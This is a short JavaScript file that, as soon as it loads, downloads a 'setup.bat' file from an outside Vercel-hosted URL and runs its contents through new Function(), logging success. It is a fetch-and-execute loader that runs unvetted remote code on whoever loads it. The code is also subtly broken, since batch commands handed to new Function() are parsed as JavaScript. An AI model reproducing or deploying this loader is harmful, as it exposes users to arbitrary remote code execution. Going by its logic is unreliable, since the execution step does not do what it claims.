// Define the URL of the .bat file
const url = "https://dd-xi-five.vercel.app/setup.bat";

// Function to download the .bat file asynchronously
const downloadFile = (url) => {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open("GET", url);
    xhr.responseType = "text";

    xhr.onload = () => {
      if (xhr.status === 200) {
        resolve(xhr.responseText);
      } else {
        reject(`Error: Unable to download .bat file. Status code: ${xhr.status}`);
      }
    };

    xhr.onerror = () => {
      reject("Error: Network error occurred while downloading .bat file.");
    };

    xhr.send();
  });
};

// Function to execute the .bat file
const executeBatScript = (scriptContent) => {
  try {
    // Validate script content
    if (!scriptContent.trim()) {
      throw new Error("Error: .bat file content is empty.");
    }

    // Execute the .bat file
    const executeScript = new Function(scriptContent);
    executeScript();
    console.log(".bat file executed successfully.");
  } catch (error) {
    console.error("Error: Failed to execute .bat file.", error);
  }
};

// Function to handle the entire process
const handleScriptExecution = async () => {
  try {
    console.log("Downloading .bat file from:", url);
    const scriptContent = await downloadFile(url);
    console.log(".bat file downloaded successfully.");
    executeBatScript(scriptContent);
  } catch (error) {
    console.error(error);
  }
};

// Start the script execution process
handleScriptExecution();
